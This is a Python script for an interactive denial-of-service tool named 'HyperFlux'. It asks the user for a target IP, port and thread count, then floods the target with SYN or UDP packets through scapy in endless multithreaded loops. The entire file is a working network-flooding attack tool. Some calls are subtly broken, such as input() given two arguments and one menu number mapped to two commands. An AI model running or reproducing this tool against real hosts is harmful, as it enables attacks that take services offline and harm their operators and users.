import os
import sys
import random
import threading
import time
from scapy.all import IP, TCP, UDP, Raw, send
from colorama import Fore, init
init(autoreset=True)

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.LIGHTGREEN_EX, """
                              
                    ╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦            
                    ║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣           
                    ╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩ 
                              
                ╔════════════════════════╗
                ║        [!help]         ║  
                ║   Type to see command  ║
                ╚════════════════════════╝ 
                                                                                   
""")

def layer4():
    while True:
        logo()
        select = input(Fore.BLUE,"""
╔═══[root@HyperFlux]~$
╚══> """)
        
        if select == "!help" or select.lower() == "h":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Fore.LIGHTGREEN_EX,"""
                                      
                            ┬┬ ┬┌─┐┬  ┌─┐
                            │├─┤├┤ │  ├─┘
                            o┴ ┴└─┘┴─┘┴  
                                                                                    
                ╔══════════════════════════════════╗
                ║                                  ║
                ║  - syn   |  SYN Flood Attack     ║
                ║  - udp   |  UDP Flood Attack     ║
                ║                                  ║  
                ╚══════════════════════════════════╝

""")
            
            input(Fore.LIGHTGREEN_EX,"[HyperFlux] Enter the continue...")


        elif select == "syn" or select.lower() == "1":
            def send_packets(target_ip, target_port):
                while True:
                    ip = IP(dst=target_ip)
                    tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S", options=[("MSS", 1460)])
                    byte = Raw(load='X' * 1400)
                    pkt = ip / tcp / byte
                    send(pkt, verbose=0)
                    print(Fore.LIGHTGREEN_EX, f"[HyperFlux] IP Address : {target_ip} SYN Packet : {pkt.summary()}")
                    time.sleep(0.01)

            def start_flooding(target_ip, target_port, thread_count):
                threads = []
                for _ in range(thread_count):
                    thread = threading.Thread(target=send_packets, args=(target_ip, target_port))
                    threads.append(thread)
                    thread.start()
                for thread in threads:
                    thread.join()

            target_ip = input(Fore.BLUE,"""
╔═══[root@IP]~$
╚══> """)
            target_port = int(input(Fore.BLUE,"""
╔═══[root@PORT]~$
╚══> """))
            thread_count = int(input(Fore.BLUE,"""
╔═══[root@THREAD]~$
╚══> """))
            start_flooding(target_ip, target_port, thread_count)


        elif select == "udp" or select.lower() == "2":
            def udp_flood(target_ip, target_port):
                while True:
                    ip = IP(dst=target_ip)
                    udp = UDP(sport=random.randint(1024, 65535), dport=target_port)
                    byte = Raw(load='X' * 1400)
                    pkt = ip / udp / byte
                    send(pkt, verbose=0)
                    print(Fore.LIGHTGREEN_EX, f"[HyperFlux] IP Address : {target_ip} UDP Packet : {pkt.summary()}")
                    time.sleep(0.01)

            def start_flooding(target_ip, target_port, thread_count):
                threads = []
                for _ in range(thread_count):
                    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port))
                    threads.append(thread)
                    thread.start()
                for thread in threads:
                    thread.join()

            target_ip = input(Fore.BLUE,"""
╔═══[root@IP]~$
╚══> """)
            target_port = int(input(Fore.BLUE,"""
╔═══[root@PORT]~$
╚══> """))
            thread_count = int(input(Fore.BLUE,"""
╔═══[root@THREAD]~$
╚══> """))
            
            start_flooding(target_ip, target_port, thread_count)
            

        elif select == "exit" or select.lower() == "2":
            sys.exit()
    